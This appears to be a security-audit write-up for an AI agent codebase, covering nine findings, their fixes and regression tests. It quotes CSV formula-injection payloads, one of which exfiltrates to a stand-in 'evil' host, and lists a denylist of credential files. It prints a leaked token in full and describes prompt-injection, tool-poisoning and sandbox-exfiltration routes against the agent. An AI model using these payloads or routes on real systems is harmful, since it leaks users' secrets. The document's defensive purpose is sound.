# Security Hardening — 2026-07 Audit

This document records the vulnerabilities found in a repository-wide security
audit, the fix applied for each, and — most importantly — **the pattern that
stops the class from recurring** plus the regression test that locks it in.

It complements [`SECURITY.md`](./SECURITY.md) (the policy + architecture
overview). Read that for the overall threat model; read this for the specific
findings and how each is prevented going forward.

> **Scope note.** The codebase was already well-hardened before this audit:
> SQL is parameterized, `run_command` is opt-in and `shell=False`, git URLs go
> through `validate_git_url`, secrets are redacted on output, YAML uses
> `safe_load`, and TLS verification is never disabled. No SQL injection, unsafe
> deserialization, `eval`/`exec`/`pickle`, or classic command injection was
> found. These are residual, mostly medium/low findings.

---

## Operational action required (not fixable in code)

**Rotate two credentials.** `.gitleaks.toml` previously allowlisted, by exact
value, a `ck_…` consumer key and the token `H9hhwS50qwxJIORLdXbIgFHMUeMKyn4h`.
Its own comment noted these were scrubbed from the working tree but **remain in
git history**. Scrubbing a secret from the tree does not invalidate it — if it
was ever pushed, it is compromised.

- **Action:** rotate/revoke both at their providers. This is the only real fix.
- The exact-value allowlist entries were **removed** so gitleaks will flag them
  if they are ever reintroduced. History was **not** rewritten (a separate,
  riskier operation — decide explicitly if the values must be purged from
  history via `git filter-repo`/BFG, and rotate first regardless).

---

## Findings, fixes, and prevention

### 1. CSV / DDE formula injection in memory export
- **Where:** `personas/sakthai/sakthai/memory/store.py` — `snapshot_to_csv`.
- **Risk:** fact/observation values are attacker-influenceable (any ingested
  document, captured lead, or conversation can `learn` a value). Written
  verbatim to a CSV cell, a value like `=cmd|'/c calc'!A1` or
  `=HYPERLINK("http://evil/?"&A1,"x")` executes when the export is opened in
  Excel / LibreOffice / Google Sheets.
- **Fix:** `_csv_safe()` prefixes a single quote to any string cell beginning
  with `=`, `+`, `-`, `@`, tab, or CR.
- **Prevention pattern:** never write untrusted strings directly into a
  spreadsheet cell — neutralize formula-trigger prefixes at the serialization
  boundary. (JSONL export is unaffected; only spreadsheet formats need this.)
- **Regression test:** `tests/test_memory_store.py::test_snapshot_to_csv_neutralizes_formula_injection`.

### 2. External MCP servers inherited every host secret
- **Where:** `personas/sakthai/sakthai/mcp/client.py` — `StdioMCPClient.start`.
- **Risk:** the spawned child got `{**os.environ, **spec_env}`, i.e. the full
  parent environment (`ANTHROPIC_API_KEY`, `OPENAI_API_KEY`,
  `TELEGRAM_BOT_TOKEN`, `HF_TOKEN`, cloud creds). A single compromised or
  curious third-party MCP server could harvest all of them.
- **Fix:** `_child_env()` builds the child environment from a minimal
  passthrough allow-list (`PATH`, `HOME`, locale, temp dir, Windows essentials)
  merged with the server spec's explicit `env`. `SAKTHAI_MCP_ENV_PASSTHROUGH=all`
  restores the old behavior for anyone who truly needs it.
- **Prevention pattern:** spawn subprocesses with least-privilege environments —
  pass what the child needs, not the whole environment. Default deny.
- **Regression test:** `tests/test_mcp_client.py::test_child_env_excludes_host_secrets`.

### 3. SSRF + cleartext bearer/data in HTTP memory sync
- **Where:** `personas/sakthai/sakthai/memory/sync.py` — `sync_memory_via_http`.
- **Risk:** only the URL scheme was checked. The full memory snapshot plus an
  `Authorization: Bearer <key>` header were POSTed to any host, over plain
  `http://`, following redirects — usable to hit cloud metadata
  (`169.254.169.254`) or internal services, or to leak the token in cleartext.
- **Fix:** `_assert_safe_sync_endpoint()` resolves the host and rejects
  private / loopback / link-local / non-global addresses, and requires `https`
  when a token is present; a no-redirect opener (`_NoRedirect`) blocks 3xx
  bounces to internal hosts.
- **Prevention pattern:** for any server-side outbound request to a
  user/config-supplied URL, validate the *resolved IP* (not just the string),
  block redirects or re-validate after each hop, and require TLS for secrets.
- **Regression tests:** `tests/test_memory_sync.py` —
  `test_rejects_private_ip_endpoint`, `test_rejects_loopback_endpoint`,
  `test_rejects_http_when_sending_token`, `test_redirects_are_blocked`.

### 4. `read_file` could read secret files under the working directory
- **Where:** `personas/sakthai/sakthai/agent/tools.py` — `_resolve_and_validate_path`.
- **Risk:** path traversal / symlink escape was already correctly blocked, but
  `cwd` is an auto-trusted read root, so `./.env`, `./id_rsa`, `./.git/config`,
  `./credentials.json` were readable by the model — an exfiltration source.
- **Fix:** `_is_sensitive_read_target()` rejects known secret basenames /
  suffixes (`.env*`, `id_rsa`, `*.pem`, `*.key`, `credentials.json`, `.netrc`,
  `.aws/credentials`, `.ssh/…`, `.git/config`, …) regardless of root, so it
  holds even for direct handler callers or a custom guardrail policy.
- **Prevention pattern:** defense-in-depth — enforce the sensitive-file denylist
  in the resolver itself, not only in a separate guardrail layer.
- **Regression tests:** `tests/test_tools.py::test_read_file_blocks_sensitive_names_even_in_cwd`,
  `::test_read_file_blocks_dot_ssh_directory`.

### 5. Inner-CLI argument smuggling (sandbox + Telegram workflow)
- **Where:** `personas/sakthai/sakthai/sandbox.py`,
  `personas/sakthai/sakthai/telegram/workflow_executor.py`.
- **Risk:** free-form task text was placed as a positional in the child
  `python -m sakthai run` argv with no `--` guard, so a value starting with `-`
  could be parsed as an option by the inner CLI.
- **Fix:** the task text is now the final argv element, after a `--` separator.
- **Prevention pattern:** always place untrusted positionals after `--` when
  building an argv for another CLI (the repo already does this in `giturl.py`
  and `extensions/install.py`).
- **Regression tests:** `tests/test_sandbox.py::test_run_in_sandbox_task_is_guarded_by_double_dash`,
  `tests/test_telegram_workflow_executor.py::test_workflow_command_uses_current_interpreter`.

### 6. `run_command` had no per-program allow-list
- **Where:** `personas/sakthai/sakthai/agent/tools.py` — `_run_command`.
- **Risk:** `SAKTHAI_SHELL_ALLOW` was a boolean gate; once set, any binary on
  `PATH` could run with any arguments.
- **Fix:** the gate now doubles as an allow-list. `SAKTHAI_SHELL_ALLOW=1`
  (or `true`/`all`/`*`) keeps the legacy "any program" behavior; any other
  value is an `os.pathsep`-separated list of permitted program names, and only
  those may run. Used by `continuous-security.yml`
  (`SAKTHAI_SHELL_ALLOW="ruff:bandit:mypy:pytest:uv:git:python:python3"`).
- **Prevention pattern:** prefer an explicit allow-list over an on/off switch
  for powerful capabilities.
- **Regression tests:** `tests/test_tools.py::test_run_command_allowlist_permits_named_program`,
  `::test_run_command_allowlist_blocks_other_programs`.

### 7. Sandbox network posture
- **Where:** `personas/sakthai/sakthai/sandbox.py`.
- **Risk:** the sandbox mounts `memory.db` read-write, injects API keys, sets
  `SAKTHAI_SHELL_ALLOW=1`, and had unrestricted egress — so a prompt-injected
  "sandboxed" task could exfiltrate the DB or keys.
- **Fix:** `SAKTHAI_SANDBOX_NETWORK` (e.g. `none`) adds a `docker --network`
  restriction. The default stays open because the sandbox must reach the model
  provider; offline/local-model users can now cut egress.
- **Prevention pattern:** make isolation configurable and document the residual
  trade-off rather than implying isolation the sandbox does not provide.
- **Regression tests:** `tests/test_sandbox.py::test_run_in_sandbox_no_network_flag_by_default`,
  `::test_run_in_sandbox_restricts_network_when_opted_in`.

### 8. External MCP tool metadata was injected unsanitized (tool poisoning)
- **Where:** `personas/sakthai/sakthai/mcp/client.py` — `as_tools`.
- **Risk:** a hostile external MCP server could smuggle prompt-injection through
  a tool `description`, or register an unsafe/overlong tool `name`.
- **Fix:** remote tool names are validated against `^[A-Za-z0-9_.-]{1,64}$`
  (others skipped), and descriptions are truncated and prefixed with an
  `[external MCP tool … — description is untrusted]` label before reaching the
  model prompt.
- **Prevention pattern:** treat all remote-advertised metadata as untrusted
  content; label and bound it before it enters a prompt.
- **Regression tests:** `tests/test_mcp_client.py::test_as_tools_skips_unsafe_tool_name`,
  `::test_as_tools_labels_and_truncates_untrusted_description`.

### 9. Unauthenticated web API could bind off-loopback
- **Where:** `personas/sakthai/sakthai/web/server.py` — `serve`.
- **Risk:** `/api/*` has no auth and returns personal memory; `serve(host=…)`
  accepted `0.0.0.0`, silently publishing memory to the network.
- **Fix:** a non-loopback bind is refused unless
  `SAKTHAI_WEB_ALLOW_PUBLIC=1` explicitly acknowledges the exposure.
- **Prevention pattern:** unauthenticated services default to loopback; require
  an explicit opt-in (and real auth) before any wider bind.
- **Regression tests:** `tests/test_web_server.py::test_serve_refuses_non_loopback_without_ack`,
  `::test_serve_allows_non_loopback_when_acknowledged`.

---

## CI / supply-chain hardening

| Finding | Fix | Prevention |
|---|---|---|
| Third-party Actions pinned to mutable tags | Pinned to commit SHAs with `# vX` comments (gitleaks, setup-uv, codecov, sonarcloud, security-devops, slack, download-artifact, create-pull-request) | Dependabot's `github-actions` ecosystem bumps SHAs; keep third-party `uses:` SHA-pinned. First-party `actions/*` may stay on tags. |
| Dependency auto-merge via PAT | `auto-dependency-update.yml` now opens a **draft** PR labeled `needs-human-review`; auto-merge language removed | A passing test suite is not sufficient to merge a dependency bump — a person reviews the diff/changelog. |
| `trust_remote_code=True` in evals | Set to `False` in `run-evals.yml` (the evaluated models use standard architectures) | Never execute remote Hub model code in CI where secrets (`HF_TOKEN`) are present; pin `revision=<sha>` if remote code is ever truly required. |
| Over-broad gitleaks allowlist | `tests` rule anchored to `(^|/)tests/`; real-credential value entries removed | Allowlist by narrow path/regex, never by hiding real secret values. Rotate, don't allowlist. |
| Root `continuous-security.yml` with `SAKTHAI_SHELL_ALLOW=1` | Scoped to a program allow-list; setup-uv SHA-pinned; documented as **dormant** (it is not under `.github/workflows/`, so it does not run) | Least-privilege tokens and shell scope for autonomous CI agents; confirm a workflow's location before relying on it. |
| Fail-open security defaults in persona `config.yaml` | `tirith_fail_open: false`, `allow_lazy_installs: false` across the four personas that had them | Security guards fail **closed**; do not install packages at runtime. |

---

## Preventing regressions

- The CI pipeline (`.github/workflows/ci.yml`) runs ruff, `mypy --strict`,
  bandit, and the hermetic pytest suite on every PR — the coverage floor is
  **97%**, so each fix above ships with a locking test.
- `secret-scan.yml` (gitleaks) and `dependency-audit.yml` (pip-audit) guard
  secrets and known-vulnerable dependencies.
- When adding a tool or an outbound request, follow the patterns above:
  least-privilege env, resolved-IP SSRF checks, `--` before positionals,
  allow-lists over on/off gates, and untrusted-content labeling.
